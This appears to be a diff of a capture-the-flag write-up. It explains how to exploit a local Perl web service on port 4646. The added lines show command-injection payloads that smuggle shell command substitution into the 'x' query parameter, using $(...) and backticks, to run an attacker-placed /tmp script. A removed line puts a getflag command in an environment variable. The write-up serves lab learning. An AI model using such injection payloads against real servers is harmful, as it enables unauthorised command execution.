@@ -1,7 +1,6 @@
 in this exercise we got a perl file at the home directory.
 The server is listening the localhost:4646 and capturing query parameters x and y.
 
-
 ```perl
     #!/usr/bin/env perl
     # localhost:4646
@@ -58,4 +57,14 @@ The solution ive found to answer all the needs to execute something :
 - Need to have no space
 - Need to be the first match
 
-Ive created a environement variable $FLAG with the value "${getflag > /tmp/flag}"
+We can write a script with uppercase name:
+    /tmp/SCRIPT
+
+Give it as argument and use the wildcard /* to test every directory from root
+    curl 'http://127.0.0.1:4646?x=/*/SCRIPT'
+
+We finaly need to use the command substitution to execute the command /tmp/SCRIPT :
+
+    curl 'http://127.0.0.1:4646?x=$(/*/SCRIPT)'
+                    or
+    curl 'http://127.0.0.1:4646?x=`/*/SCRIPT`'
